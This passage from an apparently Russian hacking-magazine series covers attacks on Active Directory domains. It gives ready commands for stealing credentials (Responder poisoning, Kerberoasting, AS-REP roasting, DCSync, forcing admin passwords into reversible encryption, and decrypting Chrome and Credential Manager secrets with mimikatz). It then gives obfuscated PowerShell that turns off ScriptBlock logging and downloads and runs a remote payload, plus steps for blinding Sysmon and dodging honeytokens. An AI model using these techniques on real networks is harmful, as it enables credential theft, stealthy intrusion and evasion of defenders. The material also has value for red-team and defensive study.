вошедшего в систему пользователя.
  Сделать это можно с помощью инструмента InternalMonologue. Он обла‐
дает широким спектром возможностей, как и мно жес твом вариантов запус ка.





       Справка InternalMonologue, загруженного через Cobalt Strike

Пример атаки Downgrade с помощью этого инс трумента и Cobalt Strike
показан на картинке ниже. Таким способом вполне реально получить Net‐
NTLMv2‐хеш пользователя, под которым выполнена атака.




             Downgrade‐атака с помощью InternalMonologue

Для взлома NetNTLMv2‐хеша также можно использовать hashcat.




                        Файл с хешем


hashcat ‐a 0 ‐m 5600 NetNTLMv2.hashes dictionary.txt




                     Результат работы hashcat

Эта атака выполняется более скрытно по сравнению с использовани ем
mimikatz, поскольку в данном случае нет необходимости загружать код
в защищенный процесс или выг ружать память из него. Так как NetNTLMv2‐
хеш становится доступен в результате вза имодействия с локальным SSPI,
сетевой трафик не регистрируется. А зна чит, в ата куемой системе остается
меньше сле дов.


LLMNR/NBT-NS POISONING
В инфраструктуре Active Directory работа с именами хостов организована
с использованием трех протоколов: DNS, LLMNR и NetBIOS. Все три обес‐
печивают взаимодействие с уда ленной машиной по ее имени, так же как и
по адресу. Если клиент Windows не может найти в сети имя определенного
хоста с использованием DNS, он выполнит запрос с помощью протокола
Link‐Local Multicast Name Resolution (LLMNR). Если и здесь он потерпит
неудачу, то будет выполнен запрос NetBIOS.
   Различие между этими протоколами заключа ется в следующем. В случае
с DNS запрос адреса по имени будет направлен на сервер, в то вре мя
как протоколы LLMNR и NetBIOS выполнят широковещательную рассылку
в локальной сети, и хост, чье имя запрашивается, должен ответить. При этом,
в отличие от NetBIOS, LLMNR способен работать с IPv6‐адресами.
  Оператор может прос лушивать широковещательные рассылки LLMNR
(UDP/5355) или NBT‐NS (UDP/137) и отвечать на них, как будто ему известно
местоположение запрошенного узла.
   Таким образом, пол ная цепь ата ки выглядит так:
 1. Пользователь вместо \\printserver по ошибке обращается  к \\
  pintserver.
 2. DNS‐сервер сооб щает, что не имеет такой записи.
 3. Клиент автоматически совершает широковещатель ный запрос.
 4. Оператор отвечает на него, представляясь несущес твующим сервером.
 5. Клиент передает аутентифика ционную информа цию оператору.





                   Схема атаки LLMNR Poisoning

На практике оператору нужен всего лишь один инструмент — Responder,
которому следует указать только сетевой интерфейс.





               Запуск Responder для LLMNR Poisoning

Успешно выполненная атака будет выглядеть так, как показано на сле дующей
иллюстрации.





              Результат успешной атаки LLMNR Poisoning

Так оператор может узнать NetNTLMv2‐хеши паролей пользователей. Как их
взламывать, уже разоб рано ранее.


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
       СБОР УЧЕТОК
  В ACTIVE DIRECTORY
            КАК ИСКАТЬ КРИТИЧЕСКИ ВАЖНЫЕ ДАННЫЕ
                          ПРИ АТАКЕ НА ДОМЕН





KERBEROASTING
Реализация протокола Kerberos в Windows использует имена участников
службы (SPN) для определения того, какую учетную запись задействовать
для шифрования билета службы. В Active Directory существует два варианта
SPN: SPN на основе хос та и произвольные SPN. Первый вариант SPN свя зан
с учетной записью компьютера домена, а второй обычно (но не всегда) —
с учеткой пользователя домена.
  В документации Microsoft написано буквально следующее: «Когда в Active
Directory создается новая учетная запись компьютера, для встроенных служб
автоматически создаются имена участников‐служб. В действительности име‐
на участников‐служб создаются только для службы HOST, а все встроенные
службы используют имя участника‐службы HOST». Но так как пароль учетной
записи компьютера по умолчанию рандомный и меняется каждые 30 дней,
оператор в контексте данной ата ки, как правило, не обращает вни мания
на имена SPN на основе хоста.
  Произвольные имена учас тников‐служб также могут быть зарегистрирова‐
ны для учетных записей пользователей домена. Наример, учетная запись
службы, которая управляет нес колькими экземпля рами MSSQL. Таким обра‐
зом,  учетная запись пользователя по умолчанию будет иметь SPN <
MSSQLSvc/HOST:PORT> для каждого экземпляра MSSQL, для которого она
зарегистрирована. Эта учетная запись хранится в атрибуте ServicePrinci‐
palName профиля пользователя.
   Как следует из специфики работы Kerberos, любой пользователь может
запросить TGS для любой службы, имеющей зарегистрированное SPN
для учетной записи пользователя или компьютера в Active Directory. Таким
образом, зная учетные данные любого пользователя домена и SPN учетных
записей из домена, оператор может запросить TGS от имени пользователя
для данных экземпляров SPN. А взло мав TGS, узнать пароли от этих учетных
записей.





                     Схема атаки Kerberoasting

Выпол нить атаку можно как уда ленно, так и при наличии непос редственного
доступа к системе. Но для начала нужно получить все SPN из сис темы. Если
есть доступ, следует использовать встроенное решение setspn.


setspn ‐T [домен] ‐Q */*





                Получение SPN с помощью setspn

Указанным способом мы получа ем SPN пользователя SQL admin, а это озна‐
чает, что он уязвим к такой ата ке. Локаль но получить билет можно с помощью
Rubeus.





               Получение билета с помощью Rubeus

Для удаленного получения SPN и билета необходимы учетные данные любого
пользователя домена.


GetUserSPNs.py ‐request ‐dc‐ip [адрес] [домен]/[пользователь]





              Получение билета с помощью impacket

Для взлома используется hashcat.


hashcat ‐a 0 ‐m 13100 krb5.hashes dict.txt





                     Результат работы hashcat

Kerberoasting можно также выполнить, перехватив сетевой трафик и захватив
билеты Kerberos TGS в случае MITM.


AS-REP ROASTING
При обычных операциях в среде Windows Kerberos, когда пользователь ини‐
циирует запрос TGT (операция Kerberos AS‐REQ), он дол жен указать времен‐
ную метку, зашифрованную своим паролем (клю чом). Метка представляет
собой структуру PA‐ENC‐TIMESTAMP и встроена в PA‐DATA (данные пред‐
варительной авторизации) AS‐REQ. KDC расшифровывает эту метку, чтобы
проверить, действительно ли совершающий операцию субъект — тот, за кого
себя выдает, а затем возвращает AS‐REP и продолжает обычные процеду ры
аутентификации.
  Подобная про верка называется предварительной аутентификацией Ker‐
beros и необходима для предотвращения автономного угадывания пароля.
Но проверку можно отключить выставлением фла га DONT_REQ_PREAUTH в UAC
учетной записи поль зователя. Чтобы отключить проверку для конкретного
пользователя, оператору необходимо наличие при вилегии GenericWrite
или GenericAll.


Set‐DomainObject ‐Identity [пользователь] ‐XOR @{useraccountcontrol=
4194304}

Дело в том, что при отключенной предварительной аутентификации Kerberos
KDC все рав но вернет AS‐REP, который, в свою очередь, зашифрован
с помощью ключа службы krbtgt. Но зашифрованная часть AS‐REP под‐
писывается клиентским клю чом, то есть ключом поль зовате ля, для которого
отправляется AS‐REQ.
  Выполнить атаку можно локально с помощью того же Rubeus.





               Получение хеша с помощью Rubeus

Для удаленной атаки нам нужно узнать пользователей, у которых отключена
предварительная аутентификация Kerberos, для чего необ ходимо иметь учет‐
ные данные любого пользователя в домене.


GetNPUsers.py [домен]/[пользователь]:[пароль]





  Получение пользователей с отключенной предварительной аутентифика‐
  цией Kerberos

Теперь выполним запрос для найденного пользователя.


GetNPUsers.py [домен]/[пользователь] ‐k ‐no‐рass ‐dc‐iр [IР]





               Получение хеша с помощью imрacket

Различие между Kerberoasting и AS‐REР Roasting сос тоит в том, что для дан‐
ной атаки нужно толь ко имя пользователя, то есть можно составить список
и проверить сразу несколько имен. Плюс ко всему можно также узнать, какие
пользователи зарегистрирова ны в системе, а какие нет.





                     Список пользователей





           Проверка имен поль зователей и получение хеша

Взломать полученный хеш можно с помощью John the Riррer.




                      Результат работы John

Другое различие между Kerberoasting и AS‐REР Roasting заключается в том,
что AS‐REP запрашивает билет проверки подлиннос ти Kerberos (TGT), а не
билет проверки подлинности служ бы (TGS).


DCSYNC
Для атаки DCSync необходимы специаль ные пра ва. Любой член групп «Адми‐
нистраторы» и «Администраторы домена», а также учетных записей компь‐
ютеров контроллера домена может выполнить репликацию данных, используя
протокол репликации катало гов DRS. Таким обра зом клиентский DC отправ‐
ляет запрос DSGetNCChanges на сервер, когда хочет получать от него
обновления объектов AD. Ответ содержит набор обновле ний, которые клиент
должен применить к своей реплике NC.
  Можно выпол нить DCSync с использованием обычной учетной записи
пользователя. Но для этого одно из следующих пра вил должно быть делеги‐
ровано на уровне домена, чтобы учетная запись пользователя могла беспре‐
пятственно получать данные с помощью DCSync:
 1. DSReplicationGetChanges —  это  раз решение  необходимо
   для репликации толь ко тех изменений, которые также реплицированы
   в глобальный каталог.
 2. DSReplicationGetChangesAll — раз решение поз воляет реп‐
   ликацию всех данных.

Члены групп «Администра торы» и «Контроллер домена» по умол чанию име ют
эти права. После того как учет ной записи делегирована возможность реп‐
ликации объектов, учетная запись может использовать mimikatz DCSync:


mimikatz# lsadump::dcsync /domain:[домен] /user:[пользователь]





                   DCSync с помощью mimikatz

Также при реализации данной ата ки можно получить историю паролей учет‐
ной записи, точ нее NTLM‐хеши. Взлом этих хешей позволит понять логику
выставления паролей, что, воз можно, поможет уга дать следующий пароль
в случае замены.





             Взлом хешей, полученных с помощью DCSync

Выпол нить DCSync можно также с помощью imрacket удаленно, для чего
нужны учетные данные.


secretsdump.py tdomain.dom/root:Secret08@192.168.226.137





                   DCSync с помощью imрacket


ПОЛУЧЕНИЕ ОТКРЫТОГО ПАРОЛЯ С ПОМОЩЬЮ DCSYNC
Но что делать, если хеш пароля не взламыва ется?





                 DCSync после изменения пароля





                 Слож ный для взло ма хеш пароля

Выход есть! Для учетных записей Active Directory существует устаревшая фун‐
кция, которая называется «обратимое шифрование». Если включено обра‐
тимое шифрование, то зашифрованные данные могут быть возвращены
обратно к паролю пользователя.
   Если для учетной записи включено обратимое шифрование и поль‐
зователь меняет пароль после уста новки этой конфигурации, пароль в виде
открытого текста сохраняется в базе данных Active Directory.
  Оператор может создать новую группу ShareRoint и добавить все учет‐
ные записи домена с атрибутом AdminCount, уста новленным в 1.


PS > New‐ADGroup ‐Name ShareRoint ‐SamAccountName ShareRoint ‐GroupC
ategory Security ‐GroupScope Global ‐DisplayName ShareRoint ‐Path
"CN=Users,DC=tdomain,DC=dom"
PS > $Admins = Get‐ADUser ‐filter { AdminCount ‐eq 1 }
PS > Add‐ADGroupMember ShareRoint ‐Members $Admins

Теперь нужно создать новую парольную политику.


PS C:\Windows\system32> New‐ADFineGrainedPasswordPolicy ‐Name ShareR
oint ‐DisplayName ShareRoint ‐Precedence 1 ‐ComplexityEnabled $false
‐ReversibleEncryptionEnabled $true ‐PasswordHistoryCount 0 ‐MinPas
swordLength 0 ‐MinPasswordAge 0.00:00:00 ‐MaxPasswordAge 0.00:00:00 ‐
LockoutThreshold 0 ‐LockoutObservationWindow 0.00:00:00 ‐Lockou
tDuration 0.00:00:00

Проверим, что атрибут ReversibleEncryptionEnabled установлен в True.


PS C:\Windows\system32> Get‐ADFineGrainedPasswordPolicy ShareRoint





                Пароль ная полити ка для ShareRoint

Теперь стоит применить парольную политику к новой группе.


Add‐ADFineGrainedPasswordPolicySubject ‐Identity ShareRoint ‐Subjects
 ShareRoint

Проверить, применилась ли парольная политика, очень легко.





                Пароль ная полити ка для ShareRoint

Новая парольная политика обну ляет все стандартные параметры безопас‐
ности паролей домена. Пос ле смены пароля, которую инициирует опе ратор,
все пароли администраторов будут храниться в открытом виде.




       Пароль пользователя в открытом виде в результате DCSync




                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
       СБОР УЧЕТОК
  В ACTIVE DIRECTORY
            КАК ИСКАТЬ КРИТИЧЕСКИ ВАЖНЫЕ ДАННЫЕ
                          ПРИ АТАКЕ НА ДОМЕН





ХРАНИЛИЩЕ ПАРОЛЕЙ WINDOWS
Data Protection API (DPAPI) — криптографичес кий интерфейс программирова‐
ния приложений в ОС семейства Windows, обеспечивающий конфиденциаль‐
ность данных путем их шифрования.
  Почти для всех криптосистем одна из самых сложных задач — управление
клю чами, вернее вопрос безопас ного хранения клю чей. Если ключ хранится
в виде обычного текста, то любой пользователь, имеющий доступ к ключу,
может получить доступ и к зашифрованным данным. DPAPI позволяет раз‐
работчикам шифровать приватные данные или клю чи, используя симметрич‐
ный ключ, полученный на основе пароля пользователя.
   DPAPI предоставляет набор API для прос того шиф рования  (CryptPro‐
tectData()) и дешифрования  (CryptUnprotectData()) данных с исполь‐
зованием  неявных  клю чей,  привязанных  к  конкретному  пользователю
или системе. Это позволяет приложениям защищать пользовательские дан‐
ные, не беспокоясь о таких вещах, как управление клю чами.
  Пароль юзера исполь зуется для получения мас тер‐ключа. Эти ключи рас‐
положены  в  папке  C:\Users\<USER>\AppData\Roaming\Microsoft\Pro‐
tect\<SID>\<GUID>, где <SID> — это идентификатор безопас ности поль‐
зователя, а <GUID> — имя мастер‐ключа. Пользователь может иметь несколь‐
ко мастер‐ключей. Этот мас тер‐ключ необ ходимо расшифровать с помощью
пароля пользователя или ключа резервного копиро вания домена, а затем
применить для расшифровки любых данных DPAPI. Поэтому, если мы попыта‐
емся расшифровать зашифрованный пользователем объект данных DPAPI
(например, cookie Chrome), нам нуж но получить конкретный мастер‐ключ
пользователя.


ПО, использующее DPAPI
Chrome использует DPAPI для хра нения двух основных типов данных, которые
интересуют оператора: содержимого фай лов cookie и сохраненных паролей.
Файлы cookie расположены по пути %localappdata%\Google\Chrome\User
Data\Default\Cookies, а данные авториза ции — %localappdata%\Google\
Chrome\User Data\Default\Login Data. В большинстве систем %localap‐
pdata% сопоставляется с C:\Users\<USER>\AppData\Local. Но сами шиф‐
рованные данные хранятся в базе данных SQLite, с которыми способен
работать mimikatz. Так как у меня установлен Chrome Dev, то в при мере вмес‐
то директории Chrome исполь зует ся директория Chrome Dev.
  Просмотреть список файлов cookie и учетных данных с помощью mimikatz
можно следующим образом:


mimikatz # dpapi::chrome /in:”%localappdata%\Google\Chrome Dev\User
Data\Default\Cookies”





                     Cookie, хранящиеся в базе данных


mimikatz # dpapi::chrome /in:”%localappdata%\Google\Chrome Dev\User
Data\Default\Login Data”





         Данные форм авто риза ции, хра нящиеся в базе данных

Однако значения файлов cookie зашифрованы DPAPI с помощью мастер‐клю‐
ча пользовате ля, который, в свою очередь, защищен паролем пользователя
(или ключом резервного копирования домена). Есть несколько сценариев,
в которых может оказать ся оператор, пытаясь получить данные файлов cookie
(или данные для входа).


1. В кон тек сте целево го пользовате ля
Самый простой случай, когда твоя сес сия находит ся в контексте целевого
пользователя. При таком раскладе следует добавить  в команду флаг
/unprotect.


mimikatz # dpapi::chrome /in:”%localappdata%\Google\Chrome Dev\User
Data\Default\Cookies” /unprotect





                      Рас шифрованные Cookie


mimikatz # dpapi::chrome /in:”%localappdata%\Google\Chrome Dev\User
Data\Default\Login Data” /unprotect





             Расшифрованные данные форм авторизации

Поскольку код выполняется в контексте пользователя, то его ключи будут
неявно  использоваться  для  рас шифровки.  Единственная  проб лема,
с которой может стол кнуть ся оператор, — это невоз можность открыть базу
данных Cookies, когда она использует ся Chrome. Тогда необходимо просто
скопировать файлы в дру гое место и повторно использовать mimikatz.


2. В кон тек сте администратора с активной сессией целево го
пользовате ля
К примеру, оператор получил административный доступ к системе, в которой
имеются пользователи, в текущий момент времени вошедшие в систему.
В этом случае прошлый сценарий не сра бота ет.





         Неудачное рас шифрование данных форм авторизации

Так происходит  потому,  что ключ юзера в текущем контексте неявно
не используется. И как видно из сообщения mimikatz, для работы необходим
мастер‐ключ пользователя (также сообщается GUID). Так как пользователь
залогинен в системе, его сес сия открыта и DPAPI хранит его ключевую
информацию. Имея административный доступ, оператор может извлечь все
данные DPAPI, где и следует искать мас тер‐ключ.


mimikatz # privilege::debug
mimikatz # sekurlsa::dpapi





                    Извлечение данных DPAPI





            Ключевая информация целево го пользователя

Теперь, когда оператор владеет мастер‐ключом, он может использовать его
для расшифровки данных пользователя.


mimikatz # dpapi::chrome /in:”С:\Users\<USER>\AppData\Local\Google\
Chrome Dev\User Data\Default\Login Data” /unprotect /masterkay:[
мастер‐ключ]





       Расшифрованные данные формы авторизации пользователя


3. В кон тек сте администратора без сессии целево го пользовате -
ля
Если целевой пользователь на текущий момент не вошел в систему, то
для получения его мастер‐ключа необ ходимо знать его SID, GUID и пароль
или NTLM‐хеш пароля. Если пароль или хеш известен (а как получить хотя бы
хеш, рассказывалось ранее), то нужно узнать только SID, GUID мы получим
из сообщения mimikatz (как в предыдущем пункте).





                      SID целевого пользователя

И теперь оператор может получить мастер‐ключ.


mimikatz # dpapi::chrome /in:”С:\Users\<USER>\AppData\Roaming\Micros
oft\Protect\<SID>\<GUID>” /sid:[SID] /password:[пароль]





                   Получение мастер‐ключа

Что делать дальше, уже подробно рас ска зывалось выше.


4. Административный доступ к кон трол леру домена
Теперь рас смотрим слу чай, ког да оператор не имеет хешей или паролей
пользователей, при этом сами пользователи в настоящий момент не залоги‐
нены  в  системе.  Как  уже  говорилось,  получить  мастер‐ключ можно
с помощью ключа резервного копирования домена. Ключ резервного
копирования никогда не меняется, и его можно использовать для рас‐
шифровки абсолютно любых клю чей пользователей домена.


mimikatz # privilege::debug
mimikatz # lsadump::backupkeys /system:[контроллер домена] /export





               Экспорт ключа резервного копирования

Далее оператору нужен GUID целево го пользователя.





                   GUID целевого пользователя

Осталось получить мастер‐ключ для это го пользователя.


dpapi::masterkey /in:[GUID] /pvk:[PVK‐ключ]





              Получение мастер‐ключа пользовате ля

Таким образом, мы рассмотрели все спо собы извлечения сохраненных
паролей.


ДИСПЕТЧЕР УЧЕТНЫХ ДАННЫХ
Диспетчер учетных данных, или Credential Manager, — это механизм, который
позволяет  управлять регистрационными данными пользователей  (логин
и пароль) для доступа к сетевым ресурсам, а также сертификатами и учет‐
ными данными для различных приложений (электронной почты, веб‐сервисов
и прочих). Рассмотрим работу с диспетчером учетных данных на примере
RDP.





    Сохраненные учетные данные в WCM через гра фический интерфейс

Найти те же данные с помощью командной строки можно следующим обра‐
зом (для английской локали следует использовать строку /listcreds:"Win‐
dows Credentials".):


> vaultcmd /listcreds:"Учетные данные Windows" /all





      Сохраненные учет ные данные в WCM через командную строку

Эти учетные данные хранятся в катало ге пользователя C:\Users\<USER>\Ap‐
pData\Local\Microsoft\Credentials\.





                      Учетные данные пользователя

Посмотрим на эти данные.


dpapi::cred /in:C:\Users\<USER>\AppData\Local\Microsoft\Credentials\[
хранилище]





             Содержимое хра нили ща учетных данных

Самое инте ресное здесь — это pbData (данные, которые нужно расшифро‐
вать) и guidMasterKey. Как получить мастер‐ключ, мы рассмотрели раньше
(эту стадию мы пропустим). Давай расшифру ем учетные данные.


dpapi::cred /in:C:\Users\<USER>\AppData\Local\Microsoft\Credentials\[
хранилище] /masterkeys:[мастер‐ключ]





            Расшифрованные учетные данные пользователя

Подобным образом можно извлечь любые данные, сохраненные в WCM.


ВМЕСТО ЗАКЛЮЧЕНИЯ
Для тех, кто хочет получить больше информа ции по этой теме, я создал телег‐
рам‐канал @RalfHackerChannel, где можно задать свои вопросы (или отве тить
на вопросы других юзеров). До встречи в следующих статьях!
ВЗЛОМ

ЗАЩИТА
ОТ ДЕТЕКТА
В ACTIVE DIRECTORY

КАК ОБМАНУТЬ
СРЕДСТВА ОБНАРУЖЕНИЯ
ПРИ АТАКЕ НА ДОМЕН





        RalfHacker
   hackerralf8@gmail.com





Проникнуть в сеть под управле нием  Active  Directory —
это только полови на успеха. Другая важ нейшая задача —
оставаться в этой сети незамеченным как можно дольше.
Поэтому сегодня мы разберем тех ники скрытия атаки от кон‐
кретных средств обнаружения и реагирования.


Дру гие статьи про ата ки на Active Directory
 • Разведка в Active Directory. Получаем пользовательские данные в сетях
   Windows без привилегий
 • Атаки на Active Directory. Раз бира ем акту альные методы повыше ния при‐
   вилегий
 • Боковое перемещение в Active Directory. Раз бираем техники Lateral Move‐
   ment при атаке на домен
 • Защита от детекта в Active Directory. Уклоняемся от обнаружения при атаке
   на домен
 • Сбор учеток в Active Directory. Как искать критически важные данные
   при атаке на домен
 • Закрепляемся в Active Directory. Как сохранить дос туп при атаке на домен




ОБХОД ЖУРНАЛИРОВАНИЯ POWERSHELL SCRIPTBLOCK
С выходом Windows 10 и PowerShell 5.0 компания Microsoft пред ставила нес‐
колько новых функций безопасности для PowerShell, в числе которых —
ведение журнала  ScriptBlock. Эта функция создает большие проблемы
для атакующего (будь то редтимер, пентестер, исследователь или злоумыш‐
ленник), так как регистрирует абсолютно все подозрительные действия
в PowerShell. И созданные ScriptBlock журналы подлежат анализу стороной
защиты.


           WARNING

                      Вся информация предоставлена исключительно
                        в ознакомительных целях. Ни редак ция, ни автор
                      не несут ответственности за любой возможный
                        вред, причинен ный информацией из этой статьи.


Как и в случае с любой службой логирования, ведением журнала ScriptBlock
управляют с помощью параметров групповой политики. PowerShell зап‐
рашивает его каждый раз, ког да обна руживает новый ScriptBlock, чтобы опре‐
делить, нужно ли его регистрировать. Но дело в том, что PowerShell выпол‐
няет запрос один раз, кеширу ет его в памяти и воз вра щает при каждом обра‐
щении.  Таким  образом,  эти  параметры  могут  быть  легко  изме нены
с помощью следующего кода.


$GroupPolicySettingsField = [ref].Assembly.GetType('System.Manage
ment.Automation.Utils').GetField('cachedGroupPolicySettings', 'NonPub
lic,Static')
$GroupPolicySettings = $GroupPolicySettingsField.GetValue($null)
$GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockLogging'
] = 0
$GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockInvocat
ionLogging'] = 0

Указанные действия можно выполнить, не обла дая привилегиями админис‐
тратора и не трогая реестр, что позволяет нам сде лать это незаметно.
Но есть одно ограничение. Новые полити ки применяются после проверки
параметров, которые будут просмотрены, ког да завершится первый Script‐
Block, что приведет к регистра ции события. Поэтому данный триггерный
ScriptBlock должен быть максимально обфусцирован и не должен нести
никакой полезной нагрузки. То есть выполняется он специально для завер‐
шения журналирования.


$GroupPolicyField = [ref].Assembly.GetType('System.Management.Automa
tion.Utils')."GetFie`ld"('cachedGroupPolicySettings', 'N'+'onPublic,
Static')
If ($GroupPolicyField) {
    $GroupPolicyCache = $GroupPolicyField.GetValue($null)
    If ($GroupPolicyCache['ScriptB'+'lockLogging']) {
        $GroupPolicyCache['ScriptB'+'lockLogging']['EnableScriptB'+
'lockLogging'] = 0
        $GroupPolicyCache['ScriptB'+'lockLogging']['EnableScriptBlo
ckInvocationLogging'] = 0
    }
    $val = [System.Collections.Generic.Dictionary[string,System.
Object]]::new()
    $val.Add('EnableScriptB'+'lockLogging', 0)
    $val.Add('EnableScriptB'+'lockInvocationLogging', 0)
    $GroupPolicyCache['HKEY_LOCAL_MACHINE\Software\Policies\Micros
oft\Windows\PowerShell\ScriptB'+'lockLogging'] = $val
}
iex (New‐Object Net.WebClient).downloadstring("https://server/
payload.ps1")

Приведенный выше скрипт выполняет  триггер для журнала, проверя ет
параметры логирования и запускает полезную нагрузку в обход журналиро‐
вания.


УКЛОНЕНИЕ ОТ РЕГИСТРАЦИИ SYSMON
Системный монитор (Sysmon) — это системная служба Windows, предназна‐
ченная для мониторинга и регистрации активности сис темы в журнале
событий Windows. Она предоставляет подробную информацию о создании
процессов, о сетевых подклю чениях и изменениях времени соз дания файлов.
Sysmon генерирует с помощью Windows Event Collection или агентов SIEM
события и собирает их. Анализ собранных событий помогает идентифици‐
ровать вредоносную или аномальную активность. Что очень важно, Sysmon
не предоставляет анализ событий, которые он генерирует, а также не пыта‐
ется защитить систему или спрятаться от злоумыш ленников.
  Sysmon — мощ ное средство анализа и представляет большую проблему
для оператора, так как поз воляет обнаружить различные индикаторы вре‐
доносной активности, например соз дание процессов, файлов, потоков
или изменение реестра. Сам Sysmon состоит из сис темной службы и драй‐
вера, который предоставляет службе информа цию. Хотя Sysmon и не пыта‐
ется себя скрыть, но имя службы и имя драйвера по умол чанию могут быть
изменены.





               Изменения имени Sysmon на DrvName

В любом случае измененное имя драйвера не проб лема, так как у каждого
драйвера есть своя аптитуда — уникальный идентификатор, который указыва‐
ет положение драйвера относитель но остальных в стеке файловой системы.
Таким образом, Sysmon имеет предопределен ное значение 385201. То есть
мы сможем обнаружить данный драйвер, даже если его переименуют.





              Дефолтная аптитуда DrvName — 385201

Для выгрузки драйвера мож но использовать fltMC, но перед этим Sysmon
запротоколирует данное действие в журнале командной строки. Лучше
использовать функции FIlterFindFirst() и FilterFindNext() из биб‐
лиотеки fltlib.dll, чтобы найти и выгрузить драйвер с аптитудой 385201
без регистрации этого события.





   Регистрация ﬂtmc.exe в журнале командной строки с помощью Sysmon

Shhmon использует эти функции для выгрузки драйвера. Чтобы это сделать,
токен  процесса  дол жен  иметь  привилегию  SeLoadDriverPrivileges,
которая есть у Shhmon за счет advapi32!AdjustTokenPrivileges.





                      Привилегии Shhmon

Таким образом, мы без детекта можем обнаружить даже переименованный
драйвер Sysmon. Для этого используем Shhmon с параметром hunt.


         Обнаружение переименованного драй вера Sysmon

Затем выгружаем драйвер, используя Shhmon с параметром kill.





         Обнаружение переименованного драй вера Sysmon

Служба Sysmon остается активной, но уже без возможности собирать
события и анализировать журналы! Правда, это происходит не бесследно, так
как перед выгрузкой драйвера будет сгенерирова но событие Sysmon с ID
255 — DriverCommunication.


              Событие Sysmon DriverCommunication

Плюс  ко  всему  использование  привилегии  SeLoadDriverPrivileges
без протоколирования доступно только для NT AUTHORITY\SYSTEM, в против‐
ном случае будет сгенерирова но событие безопасности с ID 4672. Тем
не менее активный сбор и анализ данных с помощью Sysmon перестанет
быть для нас проблемой.
  В качестве допол нения можно ска зать про инс трумент под названием In‐
voke‐Phant0m. Этот сценарий просматривает стеки потоков процесса службы
журнала событий и определяет, какие из потоков подлежат уничтожению.
Таким образом, система не сможет собирать журналы, и в то же время служ‐
ба журнала событий будет работать.


УКЛОНЕНИЕ ОТ HONEYTOKEN
Honeypot — приманка для зло умышленника. Такие ресурсы соз дают спе‐
циально для того, чтобы они подверглись атаке или несанкционированному
воздействию. Впоследс твии ана литики изучают стратегию атаки, а также
определяют, с помощью каких средств она велась. При этом успешная атака
на такой ресурс не принесет никако го вреда атакуемой инфраструктуре. Ины‐
ми словами, honeypot может представлять собой как специальный выделен‐
ный сервер, так и один отдельный сервис.
   Honeytoken’ы — это honeypot’ы, которые не являются компьютерными
системами. Например, к этой категории можно отнести вымышленные слова
или записи, которые добавляются в реальные базы данных. Они позволя ют
администраторам отслеживать утечки данных в сетях, потому что в обычных
условиях эти данные всплывать не должны вообще. Так как они вряд ли ког‐
да‐либо появятся в легитимном тра фике, honeytoken’ы могут быть легко
обнаружены с помощью IDS.
  Помимо этого, honeytoken’ами могут быть специальные учетные записи
пользователей (особен но с описанием admin или netAdmin) либо записи
в базе данных (нигде не используемые случайные поля вроде password2).
Частый пример honeytoken — нигде не используемый адрес электронной
почты.
  Но если объекты создают ся специально для того, чтобы их нашли, как опе‐
ратору не попасть в ловушку? Дело в том, что в этих объ ектах присутству ют
так называемые маркеры — признак, по которому обманка отличается
от реального объекта. К примеру, если взять объ ект «учетная запись», то
некоторые средства генерации honeytoken’ов портят следующие атрибуты:
 • objectSID — имеет неверный фор мат;
 • lastLogon — наличие пользователей, которые никогда не входили в сис‐
   тему, но имеют привилегии;
 • logonCount — если у большинс тва учетных записей средний показатель
  logonCount составляет око ло 50, а у какой‐то учетной записи — 3 или 4,
   это повод задуматься;
 • badPwdCount — нет такого пользователя, который в течение длительного
   времени ни разу не ввел бы неправильный пароль.

Как было отмечено, самый надеж ный спо соб определить аномалию —
это сравнивать со средним показа телем. Лучше что‐то оставить непроверен‐
ным, чем проверить и быть обна руженным. Еще один важный критерий —
это объекты, не сопоставлен ные с реальными компь ютерами.
  Долгие исследования и накопленные методики позволили выявить семь
самых частых типов honeytoken'ов.
 1. Фальшивая учетная запись пользователя службы с определенным SPN
   и атрибутом adminCount, равным еди нице. В этом случае будет зафик‐
   сирована попытка Kerberoasting при запросе TGS для данной учетной
   записи.
 2. Фальшивые учетные данные в памяти. Создание процес са с флагом Ne
  tOnly приведет к кешированию под дельного токена, поэтому, как только
   оператор попытается использовать эти учетные данные, он будет обна‐
   ружен. Данный подход применяют Invoke‐HoneyHash и DCEPT.
 3. Фальшивые учетные записи компь ютеров. Как уже отме чалось, соз данные
  объекты домена без привяз ки к фактическим устройствам подозрительны.
   Если использовать их для бокового перемещения, оператора обнаружат.
 4. Фальшивые данные дис петчера учетных данных. Специально вве денные
   учетные данные будут отоб ражаться при задействовании mimikatz. Соот‐
   ветственно, использование этих учетных данных немину емо приведет
   к разоблачению.
 5. Фальшивые администраторы домена. Эти учетные записи неактивны
   и никогда не использовались. Среди большого количес тва  учетных
   записей можно не учесть неактивные. Перебор учетных данных для таких
   записей сразу выдаст оператора. Этот способ используется в АТА.
 6. Фальшивые диски. Многие скрип ты или черви распространяются через
  SMB‐ресурсы, особенно если ресурс помечен как общий. Таким образом,
   все обращения к данным ресурсам будут обнаружены и зарегистрирова‐
   ны.
 7. Записи DNS. При переходе по специальным DNS‐именам данный факт
   будет зарегистрирован и оператор будет обнаружен.

Основная идея всех фальшивых объектов — заставить оператора исполь‐
зовать их. Однако оператор может изу чить эти объекты перед использовани‐
ем. Для детекта всех семи типов honeytoken’ов был разработан инструмент
Honeypot Buster. Исполь зовать его можно следующим образом.


Import‐Module .\Invoke‐HoneypotBuster.ps1
Invoke‐HoneypotBuster





   Обнаружение фальшивой учетной записи с помощью Honeypot Buster

Этот инструмент написан на PowerShell и поддерживает версии начиная с 2.0.
Для перечисления объектов используются запросы LDAP, а для сбора учетных
данных — загрузка DLL, чтобы получить доступ к LSASS.


ОБХОД APPLOCKER
Средство под названием AppLocker сни жает риск компрометации рабочих
машин. Правила Applockrt применяются к целевому приложе нию, которое
может быть исполняемым файлом, скриптом, файлом установщика и даже
DLL. У каждого правила есть условия — это критерии идентификации при‐
ложения, к которо му это правило применя ется.
   Есть три основных условия, формирующих правила: издатель, путь и хеш
файла. Условие пути к файлу определя ет приложение по его расположению
в системе. Усло вие изда теля определяет приложение на основе его циф‐
ровой подписи. Усло вие хеша файла определяет приложение на основе его
хеша.


Пе речисление правил AppLocker
Первым делом грамотный оператор постара ется узнать правила AppLocker.
В большинстве случаев применя ются пра вила по умолчанию, но также встре‐
чаются и пользовательские нас тройки. Так как пра вила AppLocker обычно
являются объектом групповой политики, то их можно запросить в Active Direc‐
